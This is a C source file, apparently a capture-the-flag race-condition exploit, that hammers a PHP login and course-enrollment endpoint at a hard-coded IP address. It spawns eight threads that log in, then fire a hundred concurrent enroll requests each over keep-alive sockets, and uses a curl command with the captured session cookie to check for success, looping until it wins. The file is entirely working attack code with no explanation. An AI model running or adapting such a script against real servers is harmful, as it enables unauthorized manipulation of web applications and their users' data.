#include <string.h>
#include <pthread.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <stdio.h>
#include <stdlib.h>

char payload1[] = "GET /login.php?username=ey%d&password=yoyoyo' HTTP/1.1\r\n"
"Host: 178.128.84.72\r\n"
"Connection: Keep-Alive\r\n"
"\r\n"
"";

char payload2[] = "GET /login.php?action=enroll HTTP/1.1\r\n"
"Host: 178.128.84.72\r\n"
"Connection: Keep-Alive\r\n"
"%s\r\n"
"\r\n"
"";

char payload3[] = "curl http://178.128.84.72/courses.php --cookie \"%s\" 2>/dev/null|grep Enrolled|grep -v 3|grep courses";

#define THREADS 8

char login_payload[10000];
char check_payload[10000];
struct sockaddr_in server_addr;

char *sessions[THREADS];
int socks[THREADS];

int sock() {
  int s = socket(2, 1, 6);
  if(connect(s, (struct sockaddr *)&server_addr, sizeof(server_addr))) {
    perror("connect");
  }
  return s;
}

int login(void *i) {
  int s = sock();
  char recvbuf[10000];
  char sendbuf[10000];
  int offset = 0;
  strcpy(sendbuf, login_payload);
  send(s, sendbuf, strlen(sendbuf), 0);
  if(sessions[(long)i]) {
    strcpy(sendbuf + strlen(sendbuf) - 2, sessions[(long)i]);
    strcat(sendbuf, "\r\n\r\n");
  }
  while(offset < sizeof(recvbuf)) {
    recv(s, recvbuf + offset, sizeof(recvbuf) - offset, 0);
    if(strstr(recvbuf, "PHPSESSID=")) {
      break;
    }
  }

  char *sess = strdup(strstr(recvbuf, "Set-Cookie") + 4);
  *strchr(sess, ';') = 0;
  sessions[(long)i] = sess;
//  puts(sess);
  socks[(long)i] = s;
}

int go = 0;

void race(void *i) {
  char *sess = sessions[(long)i];
  int s = socks[(long)i];
  char sendbuf[10000];
  char recvbuf[10000];
  sprintf(sendbuf, payload2, sess);
  int sendsize = strlen(sendbuf);
  while(!go) usleep(100);
  for(int i = 0; i < 100; i++) {
    send(s, sendbuf, sendsize, 0);
  }
  while(1) {
    int r = recv(s, recvbuf, sizeof(recvbuf), 0);
    if(r > 0) {
//      write(1, recvbuf, r);
    }
    else break;
  }
  close(s);
}

int main() {
  pthread_t threads[THREADS];

  srand(time(NULL));

  server_addr.sin_addr.s_addr = inet_addr("178.128.84.72");
  server_addr.sin_family = 2;
  server_addr.sin_port = htons(80);

  setbuf(stdout, NULL);

  while(1) {
    sprintf(login_payload, payload1, rand() & 0xffff);
    printf(".");
    for(int i = 0; i < THREADS; i++)
      pthread_create(&threads[i], NULL, login, NULL);
    for(int i = 0; i < THREADS; i++) {
      pthread_join(threads[i], NULL);
    }
    for(int i = 0; i < THREADS; i++) {
      pthread_create(&threads[i], NULL, race, NULL);
    }
    go = 1;
    for(int i = 0; i < THREADS; i++) {
      pthread_join(threads[i], NULL);
    }
    char *sess = sessions[0];
    sprintf(check_payload, payload3, strstr(sess, "PHPSESSID"));
    for(int i = 0; i < THREADS * 0; i++) {
      free(sessions[i]);
      sessions[i] = NULL;
    }
    if(!system(check_payload)) {puts(login_payload); break;}
  }
}
